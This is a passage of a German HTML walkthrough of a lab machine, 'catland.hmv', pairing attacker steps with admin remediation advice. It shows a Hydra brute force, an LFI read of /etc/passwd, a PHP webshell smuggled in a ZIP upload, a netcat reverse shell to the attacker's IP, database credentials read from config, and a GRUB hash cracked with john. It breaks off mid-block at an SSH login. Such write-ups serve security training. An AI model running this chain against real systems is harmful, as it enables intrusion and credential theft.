+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-10 22:53:43
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 108 login tries (l:1/p:108), ~7 tries per task
+[DATA] attacking http-post-form://admin.catland.hmv:80/index.php:username=^USER^&password=^PASS^:Invalid
+[STATUS] 86.00 tries/min, 86 tries in 00:01h, Ratio 0.00, Expected time 00:01h
+<span class="password">[80][http-post-form] host: admin.catland.hmv   login: laura   password: Laura_2008</span>
+[STATUS] attack finished for http-post-form://admin.catland.hmv:80/index.php:username=^USER^&password=^PASS^:Invalid (waiting for children)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-10 22:54:59
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `hydra` wird verwendet, um einen Brute-Force-Angriff auf das Login-Formular des Admin-Panels durchzuführen.
+                *   `-l laura`: Verwendet den Benutzernamen `laura`.
+                *   `-P laura.txt`: Verwendet die zuvor mit `cupp` erstellte Passwortliste.
+                *   `'http-post-form://admin.catland.hmv/index.php:username=^USER^&password=^PASS^:Invalid'`: Definiert das Ziel, die POST-Parameter (`username`, `password`) und die Fehlermeldung (`Invalid`), die bei einem Fehlschlag erwartet wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Hydra findet das korrekte Passwort `<span class="password">Laura_2008</span>` für den Benutzer `laura`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Loggen Sie sich mit den Zugangsdaten `laura`:`Laura_2008` in das Admin-Panel ein (JavaScript im Browser deaktivieren). Suchen Sie nach weiteren Funktionen, insbesondere nach Möglichkeiten zum Hochladen von Dateien oder zur Codeausführung.<br><strong>Empfehlung (Admin):</strong> Verwenden Sie starke Passwörter. Implementieren Sie Account-Lockout und CAPTCHAs.</p>
+
+             <p class="analysis"><strong>Navigation im Admin-Panel (impliziert):</strong> Nach dem erfolgreichen Login werden verschiedene Seiten im Admin-Panel gefunden: `/user.php`, `/card.php`, `/upload.php`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt, da dies die Beschreibung der Upload-Seite ist -->
+                     <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+// Auf http://admin.catland.hmv/upload.php
+Send us your expense reports as an archive:
+
+Expense report: [Upload-Feld]
+
+// Nach fehlgeschlagenem Upload-Versuch einer Nicht-Zip/RAR-Datei:
+This file extension is not allowed. Please upload a ZIP or RAR file
+These are the errors
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Seite `/upload.php` erlaubt das Hochladen von Dateien, aber nur mit den Erweiterungen `.zip` oder `.rar`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine Einschränkung, aber ZIP-Dateien können oft verwendet werden, um bösartigen Code (z.B. eine PHP-Shell) zu schmuggeln, der dann möglicherweise über eine andere Schwachstelle (wie LFI) ausgeführt wird.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erstellen Sie eine einfache PHP-Webshell, packen Sie sie in eine ZIP-Datei und laden Sie diese hoch. Suchen Sie nach einer LFI-Schwachstelle, um die Shell innerhalb der ZIP-Datei auszuführen.<br><strong>Empfehlung (Admin):</strong> Validieren Sie nicht nur die Dateierweiterung, sondern auch den Inhalt hochgeladener Dateien (MIME-Typ-Prüfung, Inhaltsanalyse). Speichern Sie Uploads außerhalb des Web-Roots und verwenden Sie nicht vorhersagbare Dateinamen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, da dies die Beschreibung einer LFI-Schwachstelle ist -->
+                     <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+// Aufruf von /user.php?page=accountancy
+Select a page: Accountancy [Go]
+http://admin.catland.hmv/user.php?page=accountancy
+
+// Versuch, /etc/passwd via LFI zu lesen (im Quellcode sichtbar)
+view-source:http://admin.catland.hmv/user.php?page=/etc/passwd
+                     </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Prompt, da dies der relevante Ausschnitt aus dem Quellcode ist -->
+                      <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+</form> <span class="comment"><!-- Maskiert: < > --></span>
+<span class="password">root:x:0:0:root:/root:/bin/bash</span>
+[...]
+<span class="password">laura:x:1001:1001:,,,:/home/laura:/bin/bash</span>
+mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
+
+    <h1>Welcome Laura</h1> <span class="comment"><!-- Maskiert: < > --></span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Seite `user.php` scheint einen `page`-Parameter zu verwenden, um verschiedene Inhalte zu laden (z.B. `accountancy`). Beim Versuch, `/etc/passwd` über diesen Parameter zu laden (`page=/etc/passwd`), wird der Inhalt der Passwortdatei im Quellcode der zurückgegebenen Seite angezeigt. Dies bestätigt eine Local File Inclusion (LFI)-Schwachstelle.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritische Schwachstelle gefunden! LFI erlaubt das Lesen beliebiger Dateien auf dem Server, auf die der Webserver-Benutzer (`www-data`) Zugriff hat. Es bestätigt auch das Vorhandensein des Benutzers `laura`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die LFI in Kombination mit der Upload-Funktion. Laden Sie die gezippte PHP-Shell hoch und versuchen Sie, sie über die LFI mit dem `page`-Parameter zu inkludieren (z.B. `page=./uploads/shell.zip`). Wenn PHP ZIP-Dateien über Wrapper wie `phar://` lesen kann, könnte der Pfad `page=phar://./uploads/shell.zip/shell.php` funktionieren.<br><strong>Empfehlung (Admin):</strong> Beheben Sie die LFI-Schwachstelle in `user.php` dringend! Validieren Sie den `page`-Parameter streng und erlauben Sie nur das Laden vordefinierter, sicherer Dateien. Verwenden Sie keine Benutzereingaben direkt in `include()`- oder `require()`-Anweisungen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">cat shell.php</span></div>
+                     <pre>
+ system($GET['cmd']);
+</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Erstellt eine minimale PHP-Webshell, die den Wert des GET-Parameters `cmd` als Systembefehl ausführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Standard-Webshell für RCE.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">cp shell.php /home/cyber/Downloads/shell.zip</span></div>
+                     <pre>[Keine Ausgabe, aber logisch falsch - sollte zippen, nicht kopieren]</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Befehl ist wahrscheinlich falsch dokumentiert. Er sollte die `shell.php` in eine ZIP-Datei packen (z.B. mit `zip /home/cyber/Downloads/shell.zip shell.php`), nicht einfach kopieren und umbenennen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Annahme: Eine korrekte `shell.zip` wurde erstellt.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                      <!-- Kein Prompt, Beschreibung der Aktion im Admin-Panel -->
+                     <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+// Auf http://admin.catland.hmv/upload.php
+Expense report: [shell.zip ausgewählt]
+<span class="password">The file shell.zip has been uploaded</span>
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die (angenommen korrekt erstellte) `shell.zip`-Datei wird erfolgreich über das Formular auf `upload.php` hochgeladen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Webshell befindet sich nun (vermutlich im Verzeichnis `./uploads/`) auf dem Server.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt, da dies eine URL ist -->
+                     <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+<span class="command">http://admin.catland.hmv//user.php?page=./uploads/shell.zip&cmd=ls</span>
+                     </pre>
+                     <!-- Kein Prompt, da dies die Ausgabe ist, die durch den Aufruf der URL erzeugt wird -->
+                     <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+Select a page: card.php config.php index.php redirect.js style.css upload.php uploads user.php
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, die LFI-Schwachstelle in `user.php` auszunutzen, um die hochgeladene `shell.zip` zu inkludieren (`page=./uploads/shell.zip`). Der Parameter `cmd=ls` wird angehängt. Überraschenderweise scheint dies zu funktionieren - PHP inkludiert die ZIP-Datei, findet darin irgendwie die `shell.php` und führt den `ls`-Befehl aus, dessen Ausgabe (Dateien im `admin`-Verzeichnis) zurückgegeben wird. Dies könnte über den `phar://`-Wrapper funktionieren, obwohl er nicht explizit angegeben ist, oder durch eine serverseitige Verarbeitung der ZIP-Datei.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Remote Code Execution (RCE) wurde erreicht! Die Kombination aus Dateiupload (eingeschränkt auf ZIP) und LFI ermöglicht die Ausführung von Befehlen als `www-data`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die RCE, um eine Reverse Shell zu erhalten.<br><strong>Empfehlung (Admin):</strong> LFI beheben! Upload-Funktion härten. Sicherstellen, dass Webserver-Prozesse keine unerwarteten Aktionen mit ZIP-Dateien durchführen können.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, da dies eine URL ist -->
+                     <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+<span class="command">http://admin.catland.hmv//user.php?page=./uploads/shell.zip&cmd=nc%20-e%20/bin/bash%20192.168.2.114%209001</span>
+                     </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die RCE-Schwachstelle wird genutzt, um einen Netcat-Reverse-Shell-Payload auszuführen.
+                *   `cmd=nc -e /bin/bash 192.168.2.114 9001`: Startet Netcat auf dem Zielserver, verbindet sich zurück zur Angreifer-IP `192.168.2.114` auf Port `9001` und führt bei Verbindung eine Bash-Shell aus (`-e /bin/bash`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der Befehl, der die Reverse Shell auslöst.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -nlvp 9001</span></div>
+                    <pre>
+<span class="password">listening on [any] 9001 ...</span>
+<span class="password">connect to [192.168.2.114] from (UNKNOWN) [192.168.2.126] 42626</span>
+<span class="prompt" style="color: yellow;">www-data@catland:/var/www/admin$</span> <span class="comment"><!-- Shell erhalten --></span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener auf dem Angreifer-System (IP `192.168.2.114`) empfängt die eingehende Verbindung vom Zielsystem (`192.168.2.126`). Eine Shell als `www-data` im Verzeichnis `/var/www/admin` wird bereitgestellt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Initialer Zugriff als `www-data` erfolgreich etabliert!</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell und beginnen Sie mit der Enumeration für die Privilegienerweiterung.<br><strong>Empfehlung (Admin):</strong> LFI und Upload-Schwachstelle beheben. Egress-Filtering implementieren.</p>
+
+            <p class="analysis"><strong>Shell-Stabilisierung:</strong> Die folgenden Befehle dienen dazu, die einfache Netcat-Shell in eine voll interaktive TTY-Shell umzuwandeln.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@catland:/var/www/admin$</span> <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                    <pre><span class="prompt" style="color: yellow;">www-data@catland:/var/www/admin$</span></pre> <span class="comment"><!-- Prompt ändert sich ggf. leicht oder bleibt gleich --></span>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@catland:/var/www/admin$</span> <span class="command">export TERM=xterm</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@catland:/var/www/admin$</span> <span class="command">^Z</span> <span class="comment"><!-- Strg+Z --></span></div>
+                    <pre>
+zsh: suspended  nc -nlvp 9001
+</pre> <span class="comment"><!-- Ausgabe auf Angreifer-Seite --></span>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                    <pre>
+[1]  + continued  nc -nlvp 9001
+</pre>
+                     <div class="prompt" style="color: yellow;">www-data@catland:/var/www/admin$</span> <span class="command">reset</span></div>
+                     <pre>
+<span class="prompt" style="color: yellow;">www-data@catland:/var/www/admin$</span> <span class="comment"><!-- Voll interaktive Shell --></span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong>
+                1.  `python3 -c '...'`: Startet eine Bash-Shell innerhalb eines Pseudo-Terminals (PTY) auf dem Ziel.
+                2.  `export TERM=xterm`: Setzt die Terminal-Variable, um Programme wie `clear` zu ermöglichen.
+                3.  `Strg+Z`: Sendet den Netcat-Prozess auf dem Angreifer-System in den Hintergrund.
+                4.  `stty raw -echo; fg`: Schaltet das lokale Terminal des Angreifers in den Raw-Modus (leitet Tastatureingaben direkt weiter) und holt den Netcat-Prozess wieder in den Vordergrund.
+                5.  `reset`: Setzt das Terminal auf dem Zielsystem zurück.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Standardverfahren zur Stabilisierung einer einfachen Reverse Shell. Ermöglicht die Verwendung von Tab-Vervollständigung, Pfeiltasten und interaktiven Programmen.</p>
+
+
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (Initial Access via LFI & Zip Upload)</h2>
+            <p class="analysis"><strong>Ziel:</strong> Demonstration, wie die Kombination aus einer eingeschränkten Datei-Upload-Funktion (nur ZIP) und einer Local File Inclusion (LFI)-Schwachstelle zur Ausführung von Code als `www-data` ausgenutzt werden kann.</p>
+            <p class="evaluation"><strong>Voraussetzungen:</strong>
+                *   Zugang zum Admin-Panel als Benutzer `laura` (`Laura_2008`).
+                *   Kenntnis der Upload-Seite (`/upload.php`) und ihrer ZIP-Einschränkung.
+                *   Kenntnis der LFI-Schwachstelle in `/user.php` über den `page`-Parameter.
+                *   Möglichkeit, eine ZIP-Datei mit einer PHP-Shell zu erstellen.
+                *   Ein Angreifer-System mit Netcat-Listener.
+            </p>
+             <p class="recommendation"><strong>Risiko:</strong> Hoch. Erlaubt Angreifern mit niedrig privilegiertem Zugriff auf das Admin-Panel (hier `laura`), Code als Webserver-Benutzer (`www-data`) auszuführen.</p>
+
+            <p class="analysis"><strong>Schritt 1: PHP-Shell erstellen und zippen</strong></p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">echo ' system($GET["cmd"]); ' > shell.php</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">zip shell.zip shell.php</span></div>
+                      <pre>  adding: shell.php (stored 0%)</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Eine einfache PHP-Webshell wird erstellt und in eine Datei namens `shell.zip` gepackt.</p>
+
+             <p class="analysis"><strong>Schritt 2: Shell hochladen</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Prompt, Beschreibung der Aktion im Admin-Panel -->
+                     <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+// Auf http://admin.catland.hmv/upload.php als 'laura' eingeloggt:
+// Datei 'shell.zip' auswählen und hochladen.
+// Erwartete Meldung: <span class="password">The file shell.zip has been uploaded</span>
+// (Vermuteter Speicherort: /var/www/admin/uploads/shell.zip)
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die `shell.zip`-Datei wird über die Upload-Funktion des Admin-Panels hochgeladen.</p>
+
+            <p class="analysis"><strong>Schritt 3: Listener starten</strong></p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -nlvp 9001</span></div>
+                     <pre><span class="password">listening on [any] 9001 ...</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System (IP: `192.168.2.114` laut Payload) wird ein Netcat-Listener gestartet.</p>
+
+            <p class="analysis"><strong>Schritt 4: LFI + RCE auslösen</strong></p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, da dies eine URL ist, die im Browser (JS deaktiviert) oder mit curl aufgerufen wird -->
+                      <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+<span class="command">http://admin.catland.hmv/user.php?page=./uploads/shell.zip&cmd=nc%20-e%20/bin/bash%20192.168.2.114%209001</span>
+                      </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die LFI-Schwachstelle in `user.php` wird genutzt, um die hochgeladene `shell.zip` zu inkludieren. Der `cmd`-Parameter übergibt den Netcat-Reverse-Shell-Befehl an die (implizit ausgeführte) `shell.php` innerhalb der ZIP-Datei.</p>
+
+             <p class="analysis"><strong>Schritt 5: Shell empfangen</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Fortsetzung der Listener-Ausgabe -->
+                     <pre>
+<span class="password">listening on [any] 9001 ...</span>
+<span class="password">connect to [192.168.2.114] from (UNKNOWN) [192.168.2.126] 42626</span>
+<span class="prompt" style="color: yellow;">www-data@catland:/var/www/admin$</span> <span class="command">id</span>
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Ergebnis:</strong> Der Listener empfängt die Verbindung und stellt eine Shell als `www-data` bereit.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der POC demonstriert erfolgreich die Ausnutzung der kombinierten Schwachstellen für RCE.</p>
+             <p class="recommendation"><strong>Empfehlung (Admin):</strong> Beheben Sie die LFI-Schwachstelle in `user.php`. Härten Sie die Upload-Funktion (Inhaltsvalidierung, sichere Speicherung).</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+             <p class="analysis"><strong>Enumeration als www-data:</strong> Nach Erhalt und Stabilisierung der Shell werden Informationen gesammelt.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@catland:/var/www/admin$</span> <span class="command">sudo -l</span></div>
+                    <pre>
+[...]
+[sudo] password for www-data:
+<span class="password">sudo: a password is required</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `sudo -l` erfordert ein Passwort für `www-data`, das nicht bekannt ist.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Keine direkten `sudo`-Rechte für `www-data`.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@catland:/var/www/admin$</span> <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre>
+[...] <span class="comment"><!-- Standard SUID Binaries --></span>
+   948550    180 -rwsr-xr-x   1 root     root         182600 Feb 27  2021 /usr/bin/sudo
+[...]
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Suche nach SUID-Dateien.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Findet nur Standard-SUID-Dateien, kein offensichtlicher Exploit-Vektor.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@catland:/var/www/admin$</span> <span class="command">ss -lnpt</span></div>
+                    <pre>
+State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port  Process
+LISTEN   0        80             <span class="command">127.0.0.1:3306</span>          0.0.0.0:*    <span class="comment"><!-- MySQL --></span>
+LISTEN   0        128              <span class="command">0.0.0.0:22</span>            0.0.0.0:*    <span class="comment"><!-- SSH --></span>
+LISTEN   0        511                    <span class="command">*:80</span>                  *:*    <span class="comment"><!-- Apache --></span>
+LISTEN   0        128                 [::]:22               [::]:*    <span class="comment"><!-- SSH IPv6 --></span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Überprüfung der lauschenden Ports.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt MySQL auf localhost, SSH und HTTP auf allen Interfaces.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@catland:/var/www/admin$</span> <span class="command">cat config.php</span></div>
+                    <pre>
+
+$hostname = "localhost";
+$database = "catland";
+$username = "admin";
+$password = "<span class="password">catlandpassword123</span>";
+
+$conn = mysqli_connect($hostname, $username, $password, $database);
+if (!$conn) {
+    die("Connection failed: " . mysqli_connect_error());
+}
+
+
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Auslesen der `config.php` im `/var/www/admin`-Verzeichnis.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Findet einen **neuen Satz Datenbank-Zugangsdaten**: `admin`:`catlandpassword123` für die Datenbank `catland`. Dies unterscheidet sich von den Zugangsdaten in `database.sql` auf der Hauptseite.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie diese neuen Zugangsdaten, um sich mit der lokalen MySQL-Datenbank zu verbinden.<br><strong>Empfehlung (Admin):</strong> Konsolidieren und sichern Sie Konfigurationsdateien. Vermeiden Sie Klartextpasswörter.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@catland:/var/www/admin$</span> <span class="command">cd /home/laura/</span></div>
+                     <div class="prompt" style="color: yellow;">www-data@catland:/home/laura$</span> <span class="command">ls -la</span></div>
+                     <pre>
+total 28
+drwxr-xr-x 3 laura laura 4096 Jan  7 14:05 .
+drwxr-xr-x 3 root  root  4096 Dec 30 16:38 ..
+lrwxrwxrwx 1 root  root     9 Dec 30 16:53 .bash_history -> /dev/null
+-rw-r--r-- 1 laura laura  220 Dec 30 16:37 .bash_logout
+-rw-r--r-- 1 laura laura 3526 Dec 30 16:37 .bashrc
+drwxr-xr-x 3 laura laura 4096 Jan  7 14:05 .local
+-rw-r--r-- 1 laura laura  807 Dec 30 16:37 .profile
+<span class="command">-rwx------ 1 laura laura   33 Jan  1 08:54 user.txt</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Überprüfung des Home-Verzeichnisses von `laura`. `www-data` hat Lesezugriff. Die Datei `user.txt` ist vorhanden, gehört `laura` und hat Berechtigungen `-rwx------`. `www-data` kann sie nicht direkt lesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt das Vorhandensein des Benutzers `laura` und der User-Flag-Datei. Direkter Zugriff auf die Flag ist als `www-data` nicht möglich.</p>
+
+             <p class="analysis"><strong>Datenbank-Enumeration (als www-data):</strong> Zugriff auf die lokale Datenbank mit den neu gefundenen Zugangsdaten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@catland:/home/laura$</span> <span class="command">mysql -uadmin -p</span></div>
+                    <pre>Enter password: <span class="password">[Passwort catlandpassword123 eingegeben]</span>
+Welcome to the MariaDB monitor. [...]
+<span class="prompt" style="color: gold;">MariaDB [(none)]></span> <span class="command">show databases;</span>
++--------------------+
+| Database           |
++--------------------+
+| catland            |
+| information_schema |
++--------------------+
+
+<span class="prompt" style="color: gold;">MariaDB [(none)]></span> <span class="command">use catland;</span>
+Database changed
+<span class="prompt" style="color: gold;">MariaDB [catland]></span> <span class="command">show tables;</span>
++-------------------+
+| Tables_in_catland |
++-------------------+
+| comment           |
+| users             |
++-------------------+
+
+<span class="prompt" style="color: gold;">MariaDB [catland]></span> <span class="command">select * from comment;</span>
++----------------------+
+| grub                 |
++----------------------+
+| <span class="password">change grub password</span> |
++----------------------+
+
+<span class="prompt" style="color: gold;">MariaDB [catland]></span> <span class="command">select * from users;</span>
++----------+------------+
+| username | password   |
++----------+------------+
+| laura    | <span class="password">laura_2008</span> |
++----------+------------+
+
+<span class="prompt" style="color: gold;">MariaDB [catland]></span> <span class="command">exit</span>
+Bye
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Erfolgreicher Login in die `catland`-Datenbank als Benutzer `admin`. Die Tabelle `users` bestätigt die Zugangsdaten `laura`:`laura_2008`, die bereits per Hydra gefunden wurden. Die Tabelle `comment` enthält einen interessanten Hinweis: "change grub password".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Datenbankzugriff liefert einen wichtigen Hinweis auf GRUB und bestätigt die Zugangsdaten für `laura`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die GRUB-Konfigurationsdatei (`/boot/grub/grub.cfg`) auf Passwörter oder Hashes, wie im Kommentar angedeutet.<br><strong>Empfehlung (Admin):</strong> Speichern Sie keine Hinweise oder sensiblen Informationen in Datenbankkommentaren. Sichern Sie die Datenbank und deren Zugangsdaten.</p>
+
+            <p class="analysis"><strong>Untersuchung der GRUB-Konfiguration:</strong></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@catland:/home/laura$</span> <span class="command">grep password /boot/grub/grub.cfg</span></div>
+                    <pre>
+# BEGIN /etc/grub.d/01_password #
+password_pbkdf2 root <span class="password">grub.pbkdf2.sha512.10000.CAEBC99F7ABA2AC4E57FFFD14649554857738C73E8254222A3C2828D2B3A1E12E84EF7BECE42A6CE647058662D55D9619CA2626A60DB99E2B20D48C0A8CE61EB.6E43CABE0BC795DC76072FC7665297B499C2EB1B020B5751EDC40A89668DBC73D9F507517474A31AE5A0B45452DAD9BD77E85AC0EFB796A61148CC450267EBBC</span>
+# END /etc/grub.d/01_password #
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `grep` durchsucht die GRUB-Konfigurationsdatei nach der Zeichenkette "password". Es wird ein Eintrag `password_pbkdf2 root ...` gefunden, der einen Passwort-Hash für den GRUB-Benutzer `root` enthält.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Passwort-Hash für den GRUB-Bootloader wurde gefunden. Das Format (`grub.pbkdf2.sha512.10000...`) ist bekannt und kann mit Tools wie `john` oder `hashcat` geknackt werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kopieren Sie den vollständigen Hash-String (`grub.pbkdf2...`). Versuchen Sie, ihn offline mit `john` oder `hashcat` und einer Wortliste (z.B. `rockyou.txt`) zu knacken.<br><strong>Empfehlung (Admin):</strong> Schützen Sie die GRUB-Konfiguration mit einem starken Passwort, wenn ein Bootloader-Passwort erforderlich ist. Beschränken Sie die Leserechte auf `/boot/grub/grub.cfg`.</p>
+
+            <p class="analysis"><strong>GRUB-Hash knacken (Offline):</strong></p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">mv laura.txt hash</span></div> <span class="comment"><!-- Dateiname hier irreführend, sollte den Hash enthalten --></span>
+                     <pre>[Keine Ausgabe]</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                    <pre>
+Warning: detected hash type "PBKDF2-HMAC-SHA512", but the string is also recognized as "HMAC-SHA256"
+[...]
+Using default input encoding: UTF-8
+Loaded 1 password hash (PBKDF2-HMAC-SHA512, GRUB2 / OS X 10.8+ [PBKDF2-SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 10000 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">berbatov</span>        (?)
+1g 0:00:00:15 DONE (2023-04-10 23:10) 0.06543g/s 148.1p/s 148.1c/s 148.1C/s football..berbatov
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der GRUB-Hash (in der Datei `hash` gespeichert) wird mit `john` und der `rockyou.txt`-Wortliste angegriffen. John the Ripper identifiziert das Hash-Format korrekt und knackt es.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Das Passwort für den GRUB-`root`-Eintrag lautet `<span class="password">berbatov</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, dieses Passwort für den SSH-Login des Benutzers `laura` wiederzuverwenden (Passwort-Recycling ist häufig).<br><strong>Empfehlung (Admin):</strong> Verwenden Sie keine schwachen oder leicht zu erratenden Passwörter, auch nicht für den Bootloader. Erzwingen Sie Passwortkomplexität.</p>
+
+            <p class="analysis"><strong>SSH-Login als Laura:</strong></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
